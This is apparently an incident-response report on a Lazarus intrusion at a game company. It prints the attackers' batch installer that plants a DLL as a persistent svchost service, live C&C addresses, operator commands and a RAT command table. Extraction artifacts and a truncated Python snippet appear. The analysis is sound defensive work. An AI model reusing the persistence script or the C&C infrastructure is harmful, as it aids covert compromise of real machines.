@@ -1,0 +1,225 @@
+HOW TO UNCOVER AN ONGOING LAZARUS ATTACK
+CONTEXT
+In late December 2018, LEXFO was contacted by a mobile video game company following multiple
+infections. The company was alerted of outgoing malicious traffic to a known Lazarus C&C that was being
+monitored.
+About 5 machines were identified as infected in the network at the time. LEXFO immediately asked
+for RAM and disk dumps of the infected systems, as well as all captured encrypted traffic and began
+investigating.
+FIRST ASSESSMENT
+LEXFO was provided with several RAM and disk dumps of the infected machines and three binaries as
+well as a configuration file and a batch installer, found on the computers and believed to have been used
+by the attackers.
+Filename Type Size
+igfx.exe PE32+ executable (GUI) x86-64 260K
+sqcsvc.dll PE32+ executable (DLL) (GUI) x86-64 2,6M
+sqcsvc.dll.mui Data 236
+svc.bat Batch script 643
+021
+A quick look at the batch script revealed that its purpose was to deploy and install the RAT payload
+~~sqcsvc.dll~~ and its encrypted configuration. The script also takes care of installing a persistent service
+named ~~sqcsvc~~ .
+~~svc.bat~~ installer script content:
+mkdir “c:\programdata\microsoft\sqcsvc”
+move
+“c:\perflogs\1.dat” “c:\programdata\microsoft\sqcsvc\sqcsvc6.ldx”
+move
+“c:\perflogs\1.dll” “c:\windows\system32\sqcsvc.dll”
+move
+“c:\perflogs\1.dll.mui” “c:\windows\system32\sqcsvc.dll.mui”
+sc create sqcsvc binPath= “%SystemRoot%\System32\svchost.exe -k sqcsvc” start= auto reg
+add “HKLM\SYSTEM\ControlSet001\Services\sqcsvc\Parameters”
+reg add “HKLM\SYSTEM\ControlSet001\Services\sqcsvc\Parameters” /v ServiceDll /t REG_EXPAND_SZ /d “%SystemRoot%\System32\sqcsvc.dll”
+reg add “HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost” /v sqcsvc /t REG_
+MULTI_SZ /d sqcsvc
+Then, LEXFO started reverse-engineering the ~~sqcsvc~~ ~~p~~ ayload that was found in the RAM and disk dumps
+in order to assess the attackers’ capabilities and find the decryption algorithm for communications.
+ATTRIBUTING THE ATTACK
+Our classifier tool didn’t show any strong link with other Lazarus samples, as the payloads
+we found were part  of the new arsenal of Lazarus at the time. The only link found
+is a Yara rule match between IGFX and a sample involved in a Lazarus heist in Taiwan
+( ~~9a776b895e93926e2a758c09e341accb9333edc1243d216a5e53f47c6043c852~~ ~~)~~ . The rule matched
+strings from the static library libcurl with the specific version ~~7.49.1~~ ~~.~~ We had to investigate further to
+confirm.
+Filenames match Lazarus’ habits, as we have the payload named “*svc.dll”, its encrypted configuration
+file as a MUI-disguised file and a batch script to install the malware. The payload is also made persistent
+by registering  it as a service, which is how Lazarus usually operate.
+Looking closely at the SQCSVC payload metadata, we can see that its original name was ~~sock_64.dll~~,
+the compilation timestamp is ~~Sat, 03 Nov 2018 00:47:21 UTC~~ which is consistent with North Korea
+working hours (UTC+9) and that it was packed using Themida Code-Virtualizer.
+At that point, Lazarus can already be considered the #1 suspect.
+Filename Compilation timestamp
+sqcsvc.dll Sat, 03 Nov 2018 00:47:21 UTC
+igfx.exe Mon, 02 May 2016 03:24:39 UTC
+hs.exe Mon, 01 Oct 2018 10:30:58 UTC
+iehelp.exe Mon, 24 Sep 2018 11:12:22 UTC
+iehelp2.exe Wed, 14 Nov 2018 14:02:19 UTC
+swpsvc.dll Sat, 11 Aug 2018 14:14:54 UTC
+022
+UNCOVERING ATTACKERS’ ACTIVITIES
+Having reverse-engineered the communication protocol and the encryption algorithm, LEXFO started
+developing a Python implementation to decrypt packets.
+Here is the identified decryption function in the SQCSVC payload:
+XOR decryption stub
+A Python implementation is quite straightforward:
+return output
+From there, we were able to write a script to automatically decrypt all traffic in the PCAP files exchanged
+between the implant and the Lazarus C&C.
+~~---- 03:34:44.251294 ethertype IPv4, IP ddd.ddd.ddd.ddd.443 > sss.sss.sss.~~
+~~sss.53477: Flags [P.], seq 1459:1557, ack 1459, win 511, length 98~~
+~~‘0000000B\x0230\x02”cmd.exe” /c “ping -n 1 XXXROOM0099”\x02’~~
+~~---- 03:34:47.465025 ethertype IPv4, IP sss.sss.sss.sss.53477 > ddd.ddd.ddd.~~
+~~ddd.443: Flags [P.], seq 1477:1943, ack 1557, win 256, length 466~~
+~~‘458\x02\r\n~~
+~~Pinging XXX.xxx.org [10.xxx.xxx.xxx] with 32 bytes of data:\r\n Reply from~~
+~~10.xxx.xxx.xxx: Destination host unreachable.\r\n~~
+~~\r\n~~
+~~Ping statistics for 10.xxx.xxx.xxx:\r\n~~
+~~Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),\r\n~~
+~~‘~~
+023
+Other manually executed commands:
+~~“cmd.exe” /c “time /t”~~
+~~“cmd.exe” /c “echo 1000 > c:\windows\temp\tmp1105.tmp”~~
+~~“cmd.exe” /c “type “c:\windows\temp\tmp1105.tmp””~~
+~~“cmd.exe” /c “type “C:\Windows\Temp\temp0917.tmp””~~
+~~“cmd.exe” /c “type C:\Windows\Temp\TMP0389A.tmp”~~
+~~“cmd.exe” /c “dir “c:\windows\temp\tmp1105.tmp””~~
+~~“cmd.exe” /c “echo 1000 > c:\windows\temp\tmp1105.tmp”~~
+~~“cmd.exe” /c “dir c:\windows\temp\tmp1105.tmp” “cmd.exe”~~
+~~/c “type c:\windows\temp\tmp1105.tmp” “cmd.exe” /c “type~~
+~~C:\Windows\Temp\TMP0389A.tmp” “cmd.exe” /c “type~~
+~~C:\Windows\Temp\temp0917.tmp” “cmd.exe” /c “type~~
+~~c:\windows\temp\tmp1105.tmp” “cmd.exe” /c “dir~~
+~~c:\windows\temp\tmp1105.tmp” “cmd.exe” /c “type~~
+~~C:\Windows\Temp\tmp1105.tmp” “cmd.exe” /c “type~~
+~~C:\Windows\Temp\temp0917.tmp” “cmd.exe” /c “type~~
+~~C:\Windows\Temp\temp0917.tmp” “cmd.exe” /c “ping -n 1 XXXROOM0099”~~
+~~“cmd.exe” /c “ping -n 1 XXXROOM0099”~~
+~~“cmd.exe” /c “time /t”~~
+~~“cmd.exe” /c “type “C:\Windows\Temp\TMP0389A.tmp””~~
+~~“cmd.exe” /c “query user”~~
+~~“cmd.exe” /c “query user”~~
+The Lazarus operators also leveraged the RAT to get information on the infected machines, using the
+directory and process listing feature of ~~SQCSVC~~ . We decrypted many fragmented packets exfiltrating
+folders and files as well as running processes.
+In some other captures, we saw that the attackers were checking the state of a service named ~~swpsvc~~ .
+This name if consistent with other Lazarus malware such as the first payload ~~sqcsvc~~, makes it very
+suspicious.
+~~“[SC] EnumQueryServicesStatus:OpenService \x1a chec(s) 1060 :\r\n~~
+~~\r\n~~
+~~Le service sp\x1a cifi\x1a n’existe pas en tant que service install\x1a .\r\n~~
+~~\r\n “~~
+~~‘\r\n~~
+~~SERVICE_NAME: swpsvc \r\n~~
+~~TYPE~~ ~~: 30 WIN32 \r\n~~
+~~STATE~~ ~~: 4 RUNNING \r\n~~
+~~(STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\r\n~~
+~~WIN32_EXIT_CODE~~ ~~: 0 (0x0)\r\n~~
+~~SERVICE_EXIT_CODE~~ ~~: 0 (0x0)\r\n~~
+~~CHECKPOINT~~ ~~: 0x0\r\n~~
+~~WAIT_HINT~~ ~~: 0x0\r\n~~
+~~‘~~
+~~‘[SC] DeleteService r\x1a ussite(s)\r\n’~~
+The Lazarus operators deleted this file when they realized that the company security team was
+investigating. Fortunately, they failed to delete it safely and LEXFO managed to recover the ~~swpsvc.dll~~
+using carving tools.
+This payload appeared to be a stage 1 RAT with a similar communication protocol.
+Further investigations of the decrypted PCAP files also revealed two other DLL plugins that were sent and
+written to disk by the attackers: an injector performing payload injection in the ~~explorer.exe~~ ~~p~~ rocess,
+and a keylogger / screencapper. Both these plugins were unknown at the time.
+We provided the client with newly-made YARA rules to detect all discovered payloads as well as a
+PowerShell script to automate the deployment process. We also implemented Suricata rules to detect
+the Lazarus fake- TLS and custom protocol traffic that can be used along with our Python script to decrypt
+the packets. This successfully stopped the attack and helped identify all infected machines.
+024
+PAYLOAD ANALYSIS
+— IGFX tool
+This binary was compiled on ~~Monday, May 02 05:24:39 2016 UTC~~ . This sample appeared to be a
+version of the Lazarus tool ~~Client_TrafficForwarder~~ described by Group-IB !REF.
+This tool’s purpose is to forward traffic to another infected host in order to relay operators’ commands.
+One interesting particularity of this tool is that the Lazarus developers used non-native Russian strings
+for command names, trying to confuse attribution:
+Translated Russian strings to mess with attribution
+This binary was compiled with a static version of libcurl v7.49.1, which is common amongst Lazarus’
+samples.
+— SQCSVC RAT
+This binary was compiled on ~~Saturday Nov 03 01:47:21 2018 UTC~~ ~~.~~
+SQCSVC configuration decryption
+025
+~~sqcsvc.dll.mui~~ ~~d~~ ecrypted configuration:
+0000 31 00 38 00 38 00 30 00 30 00 35 00 37 00 35 00 1.8.8.0.0.5.7.5.
+0010 34 00 32 00 02 00 36 00 35 00 35 00 32 00 30 00 4.2...6.5.5.2.0.
+0020 02 00 31 00 35 00 31 00 31 00 31 00 36 00 31 00 ..1.5.1.1.1.6.1.
+0030 30 00 35 00 37 00 30 00 37 00 38 00 32 00 39 00 0.5.7.0.7.8.2.9.
+0040 36 00 37 00 39 00 32 00 02 00 6d 00 65 00 6d 00 6.7.9.2...m.e.m.
+0050 62 00 65 00 72 00 2e 00 69 00 74 00 65 00 6d 00 b.e.r...i.t.e.m.
+0060 64 00 62 00 2e 00 63 00 6f 00 6d 00 3a 00 34 00 d.b...c.o.m.:.4.
+0070 34 00 33 00 02 00 31 00 38 00 30 00 2e 00 32 00 4.3...1.8.0...2.
+0080 33 00 35 00 2e 00 31 00 33 00 32 00 2e 00 32 00 3.5...1.3.2...2.
+0090 30 00 36 00 3a 00 34 00 34 00 33 00 02 00 20 00 0.6.:.4.4.3... .
+00a0 02 00 20 00 02 00 20 00 02 00 20 00 02 00 20 00 .. ... ... ... .
+00b0 02 00 30 00 02 00 36 00 30 00 02 00 30 00 02 00 ..0...6.0...0...
+00c0 36 00 35 00 35 00 32 00 31 00 02 00 6.5.5.2.1...
+This configuration contains two C&C addresses: ~~member.itemdb.com~~ and ~~180.235.132.206~~, both to
+be contacted on port 443, which is consistent with the Fake-TLS protocol implemented.
+The payload is packed using a powerful virtualization-based packer called Themida Code-Virtualizer.
+However, the attackers did not use the packer correctly and the non-obfuscated payload code can be
+dumped easily from memory.
+According to BinDiff, the non-obfuscated payload code is up to 65% similar to the code of the ~~IGFX.exe~~
+tool used by the attackers, compiled two years prior to ~~SQCSVC~~, proving that they probably come from
+the same developer team or the same code base.
+The ~~SQCSVC~~ payload is able to:
+J
+Download and write files on disks
+J
+Execute files or bash commands
+J Inject code in a running process
+J
+Listen to commands on a specified port (server mode)
+J
+Rewrite the configuration file with new values
+The payload was similar to the one described by TrendMicro after a Lazarus bank heist in Latin America
+in November, 2018 [36] .
+—
+SWPSVC (Stage 1)
+The analyzed malware sample of the group Lazarus is a “stage 1” reconnaissance malware which
+implements Remote Administration Tool features.
+The analyzed sample is a DLL library which is loaded by the ~~svchost~~ service, as it is registered as an
+~~AUTO_START~~ service for persistence. The delivery method is most likely manual. In such case, the attacker
+drops the malware on an already compromised machine.
+The malware configuration is stored encrypted in the registry, unlike most Lazarus malware that come
+with an encrypted file as configuration. In our case, the configuration data could not be retrieved as
+it was fully erased before the investigation began by the attackers that didn’t need this component
+anymore since the ~~SQCSVC~~ RAT was installed.
+The malware uses different kind of encryption for different kind of purposes. The first substitution-based
+encryption is used for decrypting encrypted strings in the static binary. The XOR-based encryption is used
+to obfuscate communications between the server and the client and to decrypt configuration content
+such as the Command-and-Control (C&C) server name and port number stored in the Windows registry.
+This RAT uses the already mentioned Fake-TLS protocol for communications:
+026
+Fake-TLS handshake sent by the RAT
+The following commands are implemented in the RAT:
+Command ID Description
+0x19283746 Get information on the infected system (processor architecture, network interfaces...)
+0x1928374 ~~C~~ ~~W~~ rite file on system
+0x1928374A Read file on system
+0x1928374F Delete file
+0x1928374F Get process info
+0x19283753 Kill process
+0x1928374D Create process
+0x19283756 Execute process as a given user
+0x19283748 List files in a directory
+0x19283755 Modify C&C configuration by changing the value in Windows regist ry
+0x19283747 List local drives and network shares
+0x19283750 Move file
+— Downloaded modules
+LEXFO found two downloaded modules in the decrypted packets that were deployed on specific targets.
+The first one is an injector that takes a file path as a parameter and injects it in an ~~explorer.exe~~ process.
+The injected file is executed in a new thread. This injector uses RC4 encryption with the hardcoded key
+~~key~~ to hide suspicious strings that are decrypted at runtime, and will write some log data to the file ~~C:\~~
+~~windows\temp\temp0917.tmp~~ .
+The second module is a keylogger and screencapper. This file is a DLL originally named ~~capture_x64.~~
+~~dll~~ by the attackers. The keylogging and screencapping features are implemented standardly
+027
+028
